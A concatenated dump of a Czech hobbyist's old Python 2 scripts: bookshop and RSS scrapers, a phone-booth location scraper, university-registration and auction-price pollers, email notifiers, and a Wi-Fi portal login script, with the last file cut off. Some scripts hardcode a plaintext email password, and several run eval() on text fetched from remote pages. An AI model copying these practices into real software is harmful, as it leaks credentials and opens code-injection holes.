#= /Payload ====================================================================



# save data
db["ignore_list"] = ignore_list
db.close()
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# zonerpress.cz v1.0.0 (28.03.2012) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Geany text editor.
#
# Notes:
    # 
#= Imports =====================================================================
import dhtmlparser as d
import CheckerTools as ch
from api.book import Book


#= Main program ================================================================
for book in d.parseString(ch.getPage("http://zonerpress.cz/inshop/scripts/rss.aspx")).find("item"):
	if len(book.find("title")) == 0:
		continue
	
	b = Book()
	b.name = book.find("title")[0].getContent().strip()
	b.url = book.find("link")[0].getContent()
	
	dom = d.parseString(ch.getPage(b.url))
	
	b.descr = ch.getVisibleText(dom.find("div", {"class":"popis"})[0].getContent())
	b.cost  = ch.getVisibleText(dom.find("p", {"class":"cenatext"})[0].getContent()).replace("&nbsp;", " ")
	
	for i in dom.find("table", {"class":"tabulka-info"})[0].find("tr"):
		if "Autor" in i.getContent():
			b.author = ch.getVisibleText(i.getContent()).replace("\n", "").replace("Autor:", "")
			break
	
	print b#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# self xml-serialization class v1.0.0 (29.03.2012) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in §Editor text editor.
#
# Notes:
    # 
import dhtmlparser as d

class Book:
	def __init__(self):
		self.oldself = dir(self)
		self.oldself.append("oldself")
	
	def __str__(self):
		childs = []
		
		for i in filter(lambda x: x not in self.oldself, dir(self)):
			childs.append(d.HTMLElement('<' + i + '>', [d.HTMLElement(eval("self." + str(i)))]))
		
		return d.HTMLElement("", [ d.HTMLElement("<book>", childs) ]).prettify()#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# NONAME v0.0.0 (dd.mm.yy) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in §Editor text editor.
#
# Notes:
    # 
import book






#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# ben.cz checker v1.0.0 (28.03.2012) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Geany text editor.
#
# Notes:
    # 
#= Imports =====================================================================
import CheckerTools as ch
import dhtmlparser as d
from api.book import Book


#= Main program ================================================================
ben = ch.getPage("http://shop.ben.cz/cz/kategorie/novinky/knihy-za-posledni-tri-mesice-pouze-ben-technicka-literatura.aspx")

books = []
for book in d.parseString(ben).find("div", {"class":"seznamKniha"}):
	b = Book()
	
	# name is separated by ":" from author
	name = book.find("a")[0].params["title"]
	if ":" in name: 
		b.author = name.split(":")[0].strip()
		b.name   = "".join(name.split(":")[1:]).strip()
	else:
		b.name   = name
		b.author = ""
	
	b.url    = book.find("a")[0].params["href"]
	b.cost   = book.find("p", {"class": "seznamCena"})[0].find("strong")[0].getContent().split("Kč")[0].strip()
	b.descr  = ch.getVisibleText((d.parseString(ch.getPage(book.find("a")[0].params["href"])).find("div", {"class":"detailPopis"})[0].prettify().split("<ol>")[0]))
	
	print b






#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# grada.cz checker v1.0.0 (28.03.2012) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Geany text editor.
#
# Notes:
    # 
#= Imports =====================================================================
import dhtmlparser as d
import CheckerTools as ch
from api.book import Book

data = unicode(ch.getPage("http://www.grada.cz/rss/rss.xml"), "windows-1250").encode("utf-8")


#= Main program ================================================================
for book in d.parseString(data).find("item"):
	if len(book.find("title")) == 0:
		continue
	
	b = Book()
	b.name = book.find("title")[0].getContent().strip()
	b.url = book.find("link")[0].getContent().strip()
	
	data = unicode(ch.getPage(b.url), "windows-1250").encode("utf-8")
	
	b.author = filter(lambda x: "Autor:" in x, data.splitlines())
	if len(b.author) > 0:
		b.author = ch.getVisibleText(b.author[0]).replace("Autor:", "")
	
	dom     = d.parseString(data)
	b.cost  = ch.getVisibleText(dom.find("div", {"class":"prices"})[0].getContent()).replace("Cena:", "").replace("Kč", "").strip()
	b.descr = ch.getVisibleText(dom.find("div", {"class":"content"})[0].getContent())
	
	print b
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# cpress.cz checker v1.0.0 (28.03.2012) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Geany text editor.
#
# Notes:
    # 
#= Imports =====================================================================
import dhtmlparser as d
import CheckerTools as ch
from api.book import Book


#= Main program ================================================================
for url in ["http://knihy.cpress.cz/?p=news", "http://knihy.cpress.cz/?p=news&page=2", "http://knihy.cpress.cz/?p=news&page=3"]:
	for book in d.parseString(ch.getPage(url)).find("div", {"class":"polozka"}):
		b = Book()
		
		b.name   = book.find("h4")[0].childs[0].getContent()
		b.url    = book.find("h4")[0].childs[0].params["href"].strip()
		try:
			b.author = book.find("a", {"class":"autor"})[0].getContent()
		except IndexError:
			b.author = "Kolektiv"
		b.cost   = book.find("div", {"class":"cena"})[0].find("span")[0].getContent()
		
		try:
			b.descr = d.parseString(ch.getPage(b.url)).find("meta", {"name":"description"})[0].params["content"]
		except IndexError:
			try:
				b.descr = ch.getVisibleText(d.parseString(ch.getPage(b.url)).find("div", {"id":"zalozka1"})[0].getContent())
			except IndexError:
				b.descr = "none"
		
		print b#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# SouradniceBudek.py v1.0.0 (02.06.2010) by Bystroushaak (bystrousak@kitakitsune.org)
#
# Tento program zjisti souradnice vsech telefonnich budek v ceske republice. Presnost je na par metru,
# ale predpokladam ze se to da upresnit pomoci udaju ulozenych v databazi pod kolonkou ostatni.
# Udaje jsou ulozeny do souboru telefonni_budky.sqlite ve formatu sqlite.
# Program neni mozna uplne nejcisteji napsany (vypocet obrazku souradnic je primo prasarna), ale zato
# muze predevsim to, ze se jedna o klasickou "jednoucelovku", u ktere nepredpokladam vic nez jedno
# spusteni a proto nema smysl se s ni nejak patlat. Naopak, v teto kategorii se imho ceni predevsim cas
# psani daneho scriptu (ideal je co nejmene).
#
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in Geany text editor.
#
#   Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
#   emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
#   U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
#   i nekomu jinemu nez me. Diky.
#
#   If you want to use this script, I'd be happy if you drop me a small feedback message. For example 
#   something about where you use this script, or just a message that this script is useful for you.
#   For most of my scripts, I dont know if they are forgotten, or they are usefull for other people.
#   Thanks.
#   
# Notes:
    # 
#===============================================================================
# Imports ======================================================================
#===============================================================================
from sqlite3 import dbapi2 as sqlite
import sqlite3
import urllib
import os
import os.path
import sys


#===============================================================================
# Variables ====================================================================
#===============================================================================
DATABASE_NAME = "telefonni_budky.sqlite"

db = None
if not os.path.exists(DATABASE_NAME):
    db = sqlite.connect(DATABASE_NAME)
    db.execute("""
        CREATE TABLE Budky(
            id INTEGER PRIMARY KEY UNIQUE,
            id2 VARCHAR(30),
            telefonni_cislo VARCHAR(25), 
            location VARCHAR(25), 
            city VARCHAR(50),
            street TEXT, 
            psc VARCHAR(6), 
            umisteni TEXT, 
            kategorie VARCHAR(50), 
            euro VARCHAR(10), 
            sms VARCHAR(10), 
            ostatni TEXT
        )
    """)
else:
    db = sqlite.connect(DATABASE_NAME)
    
db.text_factory = sqlite3.OptimizedUnicode

start_loc = [51.027202 + 1, 11.899937 - 1]   # pravej horni roh pomyslneho ctverce ktery obsahuje nasi republiku
end_loc = [48.526232 - 1, 19.14148 + 1]      # levej dolni
max_move = [0.3, 0.5]
DBG = False # pokud je nastaveno na True, vypisuje ladici informace

#===============================================================================
#= Functions & objects =========================================================
#===============================================================================
def clear():
    if os.name == "posix":
        os.system('clear')
    elif os.name in ("nt", "dos", "ce"):
        os.system('CLS')
    else: 
        pass

def getArea(loc):
    loc = str(loc[0])[:9] + "%3b" + str(loc[1])[:9]
    url = "http://mapy.1188.cz/user/map.php?S=AwYcAAAAAMgZSUEAAAAAd7NWQUdhdXNzIFBhczMAFQAAAACAhE5BF1BCMgABAA__&PX=248&PY=875&M=ngid111&W=1242&H=585&C=HY_4&P=&L=" + loc + "&SC=2000000&POIID=telephonebox"

    fp = urllib.urlopen(url)
    data = fp.read().splitlines()
    fp.close()
    
    for line in data:
        if line.startswith("m.ActiveLayersParams"):
            budky = line.replace("m.ActiveLayersParams={'poi:phoneboxes':{", "").replace("}}};", "").replace("&nbsp;", " ")

            if DBG:
                print "Pridavam zakladni udaje o budce;"

            for budka in budky.split("},"):
                try:    # na mistech kde zadna budka neni by to zpusobilo chybu
                    id, zbytek = budka.split("':")
                except:
                    continue
                    
                id = id.replace("'", "")
                
                zbytek = zbytek + "}"
                info = eval(zbytek.replace(":'", "':'").replace("',", "','").replace("{", "{'"))
                
                try:
                    db.execute(
                        """INSERT INTO Budky(id, city, street, psc, umisteni, kategorie, euro, sms) VALUES(?, ?, ?, ?, ?, ?, ?, ?)""",
                        (id, info["City"], info["Street"], info["Psc"], info["Umisteni"], info["Kategorie"], info["Euro"], info["Sms"])
                    )
                    
                    if DBG:
                        print "\tBudka cislo", id
                        
                except sqlite3.IntegrityError:
                    pass # budka uz v db je
                    
        elif line.startswith("m.SetActiveLayers"):
            budky = line.replace("m.SetActiveLayers(new Array(new AL('poi:phoneboxes', new Array(new AO", "").replace("))));", "")
            budky = budky.split(",new AO")
            
            if DBG:
                print "Pridavam rozsirene informace:"
                
            for budka in budky:
                info = eval(budka)
                
                id  = info[4] 
                id2 = info[-1]
                tel = info[5]
                
                if len(id2) < 9:
                    print info
                    print budka
                exit
                
                if "Tel: " in tel:
                    tel = tel.replace("Tel: ", "")
                
                if DBG:
                    print "\t" + id + ":\t" + id2 + "\t(" + tel + ")"
                    
                db.execute("UPDATE Budky SET id2=?, telefonni_cislo=? WHERE id = ?", (id2, tel, id))
    
    db.commit()
    
def printPic(obr, work_loc):
    clear()
    
    print
    print "Skenuji mapu .. (" + str(work_loc[0])[:9] + ";" + str(work_loc[1])[:9] + ")"
    print
    print
    print
    
    for i in range(len(obr)):
        print "  ".join(obr[i]).center(80)
        
    for i in range(4):
        print
        
     
def getLoc(eid2):
    url = "http://mapy.1188.cz/user/map.php?S=AwYcAAAAAICEHkEAAAAAwFxVQVVUTVpvbmUzMwAVAAAAAICEHkEXUEIyAAEA&PX=&PY=&M=ngid111&W=5&H=5&C=L_30&P=" + eid2 + "&SC=max&POIID=telephonebox"
    
    fp = urllib.urlopen(url)
    data = fp.read().splitlines()
    fp.close()
    
    ostatni = []
    pos = ""
    for line in data:
        if line.startswith("m.SetActiveLayers"):
            budky = line.replace("m.SetActiveLayers(new Array(new AL('poi:phoneboxes', new Array(", "")
            budky = budky.replace("))));", "").replace("),", ")")
            budky = budky.split("new AO")
            
            for budka in budky:
                if len(budka) < 10:
                    continue
                
                info = eval(budka)
                id = info[4]
                ostatni.append([id, str(str(info[1]) + "," + str(info[2]) + "," + str(info[3]))])
        elif line.startswith("m.MapPos="):
            pos = line.replace("m.MapPos='", "").replace("';", "")
    
    for i in ostatni:
        db.execute("UPDATE Budky SET location=?, ostatni=? WHERE id=?", (pos, i[1], i[0]))
        
    return pos
    
    
    
#===============================================================================
#= Main program ================================================================
#===============================================================================
work_loc= [0, 0]
work_loc[0], work_loc[1] = start_loc[0], start_loc[1]

# vypocet velikosti pro obrazek (jasne, slo to udelat vrozcem, ale desetinny mista bleee)
obr = []
cnt = 0
while work_loc[0] >= end_loc[0]:
    obr.append([])
    while work_loc[1] <= end_loc[1]:
        obr[cnt].append(".")
        work_loc[1] += max_move[1]
    cnt += 1
    work_loc[0] -= max_move[0]
    work_loc[1] = start_loc[1]


# projde celou mapu ceske republiky a sezene zaznamy o kazdem automatu
cnt = cnt2 = 0
work_loc[0], work_loc[1] = start_loc[0], start_loc[1]
print "Prochazim souradnice:"
while work_loc[0] >= end_loc[0]:
    while work_loc[1] <= end_loc[1]:
        getArea(work_loc)
        
        obr[cnt][cnt2] = "X"
        printPic(obr, work_loc)  
        
        work_loc[1] += max_move[1]
        
        cnt2+= 1

    cnt += 1    
    cnt2 = 0
    work_loc[0] -= max_move[0]
    work_loc[1] = start_loc[1]


# ------------------------------------------------------------------------------
# Zjistovani lokaci jednotlivych budek
# ------------------------------------------------------------------------------
clear()
loid2 = [] # list of id2
print "Enkoduji id2 .."
for i in db.execute("SELECT id2 FROM Budky"):
    loid2.append([i[0], urllib.urlencode({"s":i[0]})[2:]])  # dvojice id2, urlencoded_id2

cnt = 1
for id2, eid2 in loid2:
    print "Hledam souradnice budky", id2, "(" + str(cnt), "z", str(len(loid2)) + ") ..",
    
    print getLoc(eid2)
    
    if cnt % 50 == 0:
        db.commit()
    
    cnt += 1

db.close()# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import CheckerTools as c
import dhtmlparser as d



#= Variables ==================================================================
URL = "http://www.polarissf.cz/souborPOLAR/novinky.htm"



#= Functions & objects ========================================================
class Book:
	def __init__(self):
		self.author = ""
		self.title  = ""
		self.descr  = ""
		self.image_url = ""

		self.size = 0
		self.cost = 0
		self.date = "" # todo: parse to timestamp (that will be hard)
		self.envelope   = ""
		self.translator = ""

	def processMeta(self, meta_str):
		for m in meta_str.split(","):
			m = m.strip()

			if "str." in m.lower():
				self.size = int(m.split()[0])
			elif "obálka" in m.lower():
				self.envelope = " ".join(m.split()[1:])
			elif "překlad" in m.lower():
				self.translator = " ".join(m.split()[1:])
			elif "cena" in m.lower():
				self.cost = m.lower().replace("cena", "").replace("kč", "")
				self.cost = int(self.cost.strip())
			elif "vyjde" in m.lower() or "vyšlo" in m.lower():
				self.date = " ".join(m.split()[1:])

	def __str__(self):
		o  = self.author + " - " + self.title + "\n"
		o += self.descr + "\n\n\n"
		o += self.image_url + "\n\n---\n"

		if self.size != 0:
			o += "str: " + str(self.size) + "\n"
		if self.cost != 0:
			o += "cena: " + str(self.cost) + "\n"
		if self.date != "":
			o += "datum: " + self.date + "\n"
		if self.envelope != "":
			o += "obálka: " + self.envelope + "\n"
		if self.translator != "":
			o += "překladatel: " + self.translator + "\n"

		return o + "\n\n"



def parse():
	data = c.getPage(URL).decode("windows-1250").encode("utf-8")
	data = data.replace("<BR>", "\n").replace("<br>", "\n")
	dom = d.parseString(data)

	books = []
	for tr in dom.find("tr"):
		if len(str(tr)) <= 20:
			continue

		b = Book()

		first_b = tr.find("b")[0]
		author, title = first_b.getContent().split(":")
		first_b.replaceWith(d.HTMLElement(""))

		b.author = author.strip()
		b.title  = title.strip()

		__ = tr.find("i")[-1]
		meta_info = __.getContent()
		__.replaceWith(d.HTMLElement(""))

		b.processMeta(meta_info)

		# remove <font>s
		map(
			lambda x: 
				x.replaceWith(
					d.HTMLElement(
						x.getContent().strip()
					)
				),
			tr.find("font")
		)
		b.descr = tr.find("td")[0].getContent().strip()

		b.image_url = tr.find("td")[1].find("img")[0].params["src"] # TODO: absolutni adresy

		books.append(b)

	return books#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#~ stag.predmety.checker.py v1.0.0 (02.02.2010) by Bystroushaak - bystrousak@kitakitsune.org.
#~ This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
#~ Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
#~ Created in §Editor text editor.
#~
##~ Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
##~ emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
##~ U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
##~ i nekomu jinemu nez me. Diky
#~
#~ Notes:
    #~  Pulnocni vydani..
# imports
import getpass
import smtplib
import time
import urllib
import urllib2
from BeautifulSoup import BeautifulSoup as BS

# variables
url = "https://stag.tul.cz/relay/predzapis/pg$_predzapis.startup?prac_zkr=NTI&zkr_predm=TGH&semestr=LS&stplidno=6799&oboridno=2643&rocnik=2&blokidno=30474"
username = "M08000175"

# functions & objects
def getPage(url, username, passwd): # big thx to http://www.voidspace.org.uk/python/articles/authentication.shtml#id1
    passman = urllib2.HTTPPasswordMgrWithDefaultRealm()
    passman.add_password(None, url, username, passwd)

    authhandler = urllib2.HTTPBasicAuthHandler(passman)

    opener = urllib2.build_opener(authhandler)

    urllib2.install_opener(opener)

    ph = urllib2.urlopen(url)
    data = ph.read()
    ph.close()

    return data

# functions & objects
def sendMail(status):
    ## mail config
    mfrom= "pastebin.com.checker@gmail.com"
    mto= "nechcesvedet@vodafonemail.cz"
    msubj= "STAG :: "

    msmtp= "smtp.gmail.com"                 # smtp server
    mnick= "pastebin.com.checker"           # username (gmail username in this case)
    mpass= "supertajnehesloprogmailucetcheckerupastebin.com"  # password (gmail pass)

    msg = "From: %s\r\nSubject: %s\r\nTo: %s\r\n\r\n" % (mfrom, msubj, mto)

    if status:
        msg += "Uvolnilo se misto v pondeli!"
    else:
        msg += "Fuck, pondeli je obsazeny!"
    msg += "\n"

    server = smtplib.SMTP(msmtp)
    server.ehlo()
    server.starttls()
    server.ehlo()

    server.login(mnick, mpass)
    server.sendmail(mfrom, mto, msg)
    server.quit()

# main program
passwd = getpass.getpass("Passwd: ")

while 1:
    try:
        print "Nacitam ulozena data .. ",
        file = open("stag.predmety.checker.dat", "r")
        status = file.read()
        file.close()

        # parsovani minuleho statusu
        if "True" in status:
            status = True
        else:
            status = False
            
        print "OK"
    except:
        print "soubor neexistuje, nastavuji defaultni hodnoty."
        status = False   # status ze je obsazeno

    try:
        print "Stahuji stranku ze stagu ..",
        data = getPage(url, username, passwd)

        if len(data) <= 100:
            print "aw, nic neprislo :/"
        else:
            print "stranka stazena."
    except:
        print "jej, chyba!"
        continue;

    print "Parsuji stranku ..",
    soup = BS(data)
    tr = soup("tr")
    hodina = ""
    for i in range(len(tr)):
        if "Út 12:30-14:05" in str(tr[i]):
            hodina = str(tr[i])
    print "OK"
    
    #print hodina

    if ("type=\"CHECKBOX\"" in hodina) != status:
        # posli sms
        print "Zmena stavu, posilam upozorneni .."
        sendMail(status)
        print "OK"

        # uloz stavajici status
        print "Zapisuji novy status ..",
        file = open("stag.predmety.checker.dat", "w")
        file.write(str(not status))
        file.close()
        print "OK"
    
    print "Cekam 10m"
    time.sleep(60 * 10) # cekani 10m
# -*- coding: utf-8 -*- 
#~ NAME v0.0.0 (dd.mm.yy) by bystrousak@seznam.cz.
#~ Created in SciTE text editor.
#~
#~ Poznamky:
    #~  

import ClientCookie, BeautifulSoup, time, winsound

def stahni(co):
    try:
        spoj= ClientCookie.urlopen(co)
        data= spoj.read()
        spoj.close()
    except:
        print "Error: Nelze se pripojit (nejde internet, server, ..)"
        return "Error!"

    return data

def parsuj(data):
    soup= BeautifulSoup.BeautifulSoup(data)
    cena= soup("td", {"style": "padding: 4px; padding-left: 6px; font-size: 10pt; background: white; border-left: #c3c3c3 1px solid; border-bottom: #c3c3c3 1px solid;"})[0]

    soup= BeautifulSoup.BeautifulSoup(str(cena))
    cena= soup("b")[0].string[0:-3]
    
    return cena

def reaguj(cena):
    if cena!=pcena:
        print ":> Aktualni cena:", cena
        winsound.Beep(1500,1000)
        
        return cena
    
    return pcena

adresa= "http://www.aukro.cz/show_item.php?item=387698017"
pcena= ""

while 1:
    data= stahni(adresa)

    if data!="Error!":
        cena= parsuj(data)

    pcena= reaguj(cena)

    time.sleep(10)#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#~ pastebin.com.checker v1.0.2 (23.07.09) by Bystroushaak - bystrousak@kitakitsune.org.
#~ This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
#~ Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cs/).
#~ Created in gedit text editor.
#~
##~ Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
##~ emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
##~ U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
##~ i nekomu jinemu nez mne. Diky
#~
#~ Notes:
    #~  This script sends new personal pastebin.com post on your mail.
    #~  You need gmail account, which will be used for sending mails.
    
# imports
import urllib2
import smtplib
import sys

# variables
rootlink= "http://benny.pastebin.com"
database= "pastebin.com.dtb"            # filename of old links database

## mail config
mfrom= "pastebin.com.checker@gmail.com"
mto= "bystrousak@kitakitsune.org"
msubj= "Changes on " + rootlink

msmtp= "smtp.gmail.com"                 # smtp server
mnick= "pastebin.com.checker"           # username (gmail username in this case)
mpass= "supertajnehesloprogmailucetcheckerupastebin.com"  # password (gmail pass)

# functions & objects
def sendMail(links):    
    msg = "From: %s\r\nSubject: %s\r\nTo: %s\r\n\r\n" % (mfrom, msubj, mto)
    
    for i in links:
        msg+= "----------------New post ( " + i + " )----------------"
        msg+= "\n\n"
        msg+= parseContent(downloadLink(i))
        msg+= "\n\n"
        msg+= 80 * "-"
        msg+= "\n"
    
    server = smtplib.SMTP(msmtp)
    server.ehlo()
    server.starttls()
    server.ehlo()

    server.login(mnick, mpass)
    server.sendmail(mfrom, mto, msg)
    server.quit()

# Parse users source code
def parseContent(string):
    string= string.splitlines()
    
    output= []
    stav= 0
    for i in string:
        if i.endswith('</textarea>'):    # end tag
            output.append(i.split('</')[0])
            stav= 0
        if stav == 1:
            output.append(i)
        if i.startswith('<textarea id="code"'):  # start tag
            stav= 1
            output.append(i.split('">')[1])
    
    output= "\n".join(output)
    
    ## replacing html entities
    output= output.replace("&lt;", "<")
    output= output.replace("&gt;", ">")
    output= output.replace("&quot;", '"')
    
    output= output.replace("&amp;", "&")    # must be last
    
    return output
    
# Parse list of links
def parseList(string):
    string= string.splitlines()
    newlist= []
    
    ## parse Recent post
    stav= 0
    for i in string:
        if i == """<li><a rel="nofollow" href="/pastebin.php">Make new post</a></li></ul>""":   # end tag
            stav= 0
        if stav:
            newlist.append(i)
        if i == "<h1>Recent Posts</h1>":    # start tag
            stav= 1
            
    newlist= newlist[1:]    # remove <ul> at first index
    
    ## parse links
    links= []
    for i in newlist:
        links.append(i.split('"')[1])
    
    return links

# Create file with actual links
def createDb(data):
    try:
        file= open(database, "w")
        file.write("\n".join(data))
        file.close()
    except IOError, e:
        print "Error!"
        print "Read only filesystem?"
        print e

# Download url
def downloadLink(url):
    try:
        fp= urllib2.urlopen(url)
        data= fp.read()
        fp.close()
    except:
        print "Error!!"
        print "Cant download", url
        sys.exit()
        
    return data

# main program
## download rootlink and parse actual list
print "\tDownloading", rootlink, "..",
newlist= downloadLink(rootlink)
print "done."

## parse links from downloaded html 
try:
    print "\tParsing list from", rootlink, "..",
    newlist= parseList(newlist)
    print "done."
except:
    print "Error!!"
    print "Cant parse list from", rootlink
    sys.exit()

## open saved list (for compare with parsed list)
try:
    file= open(database, "r")
    oldlist= file.read().splitlines()
    file.close()
except IOError, e:
    createDb(newlist)
    oldlist= [""]
    
## compare saved list with downloaded list
print "\tFinding news ..",
if newlist != oldlist:
    print "found."
    
    ## comparing..
    newlinks= []
    for i in range(10):
        if oldlist[0] == newlist[i]:
            newlinks= newlist[:i]
            
    if newlinks == []:
        newlinks= newlist
    
    ## print new links
    for i in newlinks:
        print "\t\tNew:", i
    
    ## send information email
    print "\tSending mail to", mto, "..",
    sendMail(newlinks)
    print "done."
    
    ## save new links as old links
    print "\tSaving new list ..",
    createDb(newlist)
    print "done."
else:
    print "no news."
# -*- coding: utf-8 -*- 
#~ NAME v0.0.0 (dd.mm.yy) by bystrousak@seznam.cz.
#~ Created in SciTE text editor.
#~
#~ Poznamky:
    #~  

import urllib2, sys, smtplib
from BeautifulSoup import  BeautifulSoup

def SendMail(to, fromw, subject, text):
    msg = "From: %s\r\nSubject: %s\r\nTo: %s\r\n\r\n" % (fromw, subject, to)
    msg+= msg+ text
    
    server = smtplib.SMTP('mx1.seznam.cz') 
    server.sendmail(fromw, to, msg)
    server.quit()
   

## Main program:
try:
    fp= urllib2.urlopen("http://skola.security-portal.cz/")
    data= fp.read()
    fp.close()
except:
    sys.exit()

soup= BeautifulSoup(data)
data= str(soup("div", {"class": "mbox"})[0])
print

try:
    file= open("skola.s-p.cz.tmp", "r")
    tmpdata= file.read()
    file.close()
    
    file= open("skola.s-p.cz.tmp", "w")
    file.write(data)
    file.close()
except:
    file= open("skola.s-p.cz.tmp", "w")
    file.write(data)
    file.close()
    tmpdata= data

if data!=tmpdata:
    SendMail(
    "bystrousak@seznam.cz",
    "hlubina@internetu.net",
    "Zmena stranek skola.s-p.cz",
    "Na strankach http://skola.security-portal.cz/ doslo ke zmenam. Pro blizsi informace navstivte http://skola.security-portal.cz/.")

    print "Detekovany zmeny, upozornuji pomoci emailu."
else:
    print "Zadne zmeny nedetekovany.."



#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# lianeOpener v1.0.0 (31.03.2010) by Bystroushaak - bystrousak@kitakitsune.org.
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in WingIDE 101.
#
#   Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
#   emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
#   U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
#   i nekomu jinemu nez me. Diky
#
# Notes:
    # Dont forget change usr and pwd variables in Variables section!
    #
#===============================================================================
# Imports ======================================================================
#===============================================================================
import urllib
import urllib2
import sys

try:
    from BeautifulSoup import BeautifulSoup as BS
except Exception, e:
    print 
    print "-" * 80
    print ">" * 3, "You need BeautifulSoup (http://www.crummy.com/software/BeautifulSoup/)", "<" * 3
    print ">" * 3, "Download it, unpack and instal, or just copy into this directory.", "<" * 3
    print "-" * 80
    print
    raise e



#===============================================================================
# Variables ====================================================================
#===============================================================================
url = "http://google.com"
# Headers from Internet explorer
IEHeaders = {
    "User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
    "Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
    "Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
    "Accept-Charset": "utf-8; windows-1250",
    "Keep-Alive": "300",
    "Connection": "keep-alive",
}
usr = "usr@tul.cz"
pwd = "usrpwd"



#===============================================================================
#= Functions & objects =========================================================
#===============================================================================
def getPage(url, par = None, headers = IEHeaders):
    if par != None:
        par = urllib.urlencode(par)
    
    try:
        f = urllib2.urlopen(urllib2.Request(url, par, headers))
        data = f.read()    
        f.close()
    except Exception, e:
        print "Connection problem:", e
        sys.exit()
    
    return data



#===============================================================================
#= Main program ================================================================
#===============================================================================
data = getPage(url)

## parse auth url
try:
    url = BS(data)("meta", {"http-equiv" : "refresh"})[0]["content"]
    url = str(url).split("URL=")[-1]
except:
    print "Are you sure that you are connected on liane?"
    sys.exit()
    
data = getPage(url)

# parse switch_url parametr
switch_url = ""
for i in data.splitlines():
    if "var url =" in i and "switch_url" in i:
        switch_url = str(i.split("switch_url=")[-1])[:-2]

# get domain
url = url.split("/")
url = url[0] + "//" + url[2]

# download auth page with switch_url parametr
data = getPage(url + "/fs/customwebauth/login.html?switch_url=" + switch_url)
IEHeaders["referer"] = url + "/fs/customwebauth/login.html?switch_url=" + switch_url
        
# parse auth informations
params = {
    "buttonClicked" : 4,
    "redirect_url" : "google.com",
    "err_flag" : 0,
    "info_flag" : 0,
    "info_msg" : 0,
    "username" : usr,
    "password" : pwd,
}

# send auth data
data = getPage(url + "/login.html", params)

# check login
if BS(data)("title")[0].string == "Logged In":
    print "Logged In"
else:
    raise Exception("Not logged in!")    
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#~ stag.checker.py v1.0.0 (05.01.2010) by Bystroushaak - bystrousak@kitakitsune.org.
#~ This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
#~ Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
#~ Created in §Editor text editor.
#~
##~ Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
##~ emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
##~ U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
##~ i nekomu jinemu nez me. Diky
#~
#~ Notes:
    #~  Pulnocni vydani..
# imports
import getpass
import smtplib
import time
import urllib
import urllib2
from BeautifulSoup import BeautifulSoup as BS

# variables
url = "https://stag.tul.cz/apps/stag/zkousky/index"
username = "M08000175"

# functions & objects
def getPage(url, username, passwd): # big thx to http://www.voidspace.org.uk/python/articles/authentication.shtml#id1
    passman = urllib2.HTTPPasswordMgrWithDefaultRealm()
